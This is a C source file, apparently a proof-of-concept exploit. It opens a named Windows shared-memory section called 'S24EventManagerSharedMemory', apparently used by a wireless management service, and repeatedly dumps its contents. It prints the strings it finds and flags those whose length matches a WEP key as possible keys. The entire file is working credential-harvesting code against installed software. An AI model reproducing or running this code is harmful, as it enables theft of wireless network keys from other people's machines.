
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_5__ TYPE_2__ ;
typedef struct TYPE_4__ TYPE_1__ ;


typedef int buff ;
typedef int UNICODE_STRING ;
struct TYPE_4__ {int QuadPart; } ;
struct TYPE_5__ {TYPE_1__ SectionSize; } ;
typedef TYPE_2__ SECTION_BASIC_INFORMATION ;
typedef scalar_t__ (* PQUERYSECTION ) (int *,int ,TYPE_2__*,int,int ) ;
typedef int (* POPENSECTION ) (int **,int,int *) ;
typedef int OBJECT_ATTRIBUTES ;
typedef int * LPVOID ;
typedef int * HANDLE ;
typedef int DWORD ;


 int CloseHandle (int *) ;
 int FILE_MAP_READ ;
 scalar_t__ GetProcAddress (int ,char*) ;
 int InitializeObjectAttributes (int *,int *,int *,int *,int *) ;
 int InitializeUnicodeStr (int *,char*) ;
 int LoadLibrary (char*) ;
 int * MapViewOfFile (int *,int ,int ,int ,int ) ;
 int SECTION_MAP_READ ;
 int SECTION_QUERY ;
 int ShowError () ;
 int Sleep (int) ;
 int printf (char*,...) ;

int main(int argc, char* argv[])
{
 OBJECT_ATTRIBUTES SectionAttributes;
 SECTION_BASIC_INFORMATION buff;
 PQUERYSECTION NtQuerySection;
 POPENSECTION NtOpenSection;
 char * sMap,cString[256];
 UNICODE_STRING uStr;
 LPVOID lpMapAddress;
 DWORD i,b=0,c=0;
 HANDLE hSection;


NtOpenSection = (POPENSECTION) GetProcAddress( LoadLibrary( "ntdll.dll" ),
         "NtOpenSection" );

NtQuerySection = (PQUERYSECTION) GetProcAddress( LoadLibrary( "ntdll.dll"),
       "NtQuerySection" );

InitializeUnicodeStr(&uStr,L"\\BaseNamedObjects\\S24EventManagerSharedMemory");
InitializeObjectAttributes(&SectionAttributes, &uStr,((void*)0), ((void*)0), ((void*)0) );


NtOpenSection( &hSection, SECTION_MAP_READ|SECTION_QUERY, &SectionAttributes );

if (hSection == ((void*)0)) ShowError();
printf("Section opened successfully.\n");


lpMapAddress = MapViewOfFile(hSection, FILE_MAP_READ, 0, 0, 0);
if (lpMapAddress == ((void*)0)) ShowError();

if (NtQuerySection(hSection,0,&buff,sizeof(buff),0)) ShowError();

sMap= ( char* )lpMapAddress;
printf("Scanning section...\n\n");

while(c<100)
{

 c++;
 printf("\nSNAPSHOT ID[%d]----------------[BEGIN]\n\n",c);

 for (i=0; i< buff.SectionSize.QuadPart; i++)
 {

  if( sMap[i]> 0x29 )
  {
   while( sMap[i] != 0x0 )
   {
    if( sMap[i]>=0x30 )
    {
     cString[b] = sMap[i];
     b++;
    }
    i++;
   }

   cString[b++]='\0';

   if( b>3 && b!=14 && b!=27 ) printf(" String collected: %s\n",cString);

   if( b==14 ) printf("### Possible Alphanumeric WEP KEY found: %s\n",cString);
   if( b==27 )
   {
                     if(cString[0]!=0x30 && cString[2]!=0x30 && cString[6]!=0x30)
                          printf("### Possible WEP KEY found(Ascii/HexMode): %s\n",cString);
                                else
                          printf(" String collected: %s\n",cString);
                 }
                 b=0;
  }

 }
printf("\nSNAPSHOT ID[%d]----------------[END]\n",c);

Sleep(1000);
}

CloseHandle(hSection);

return 0;
}
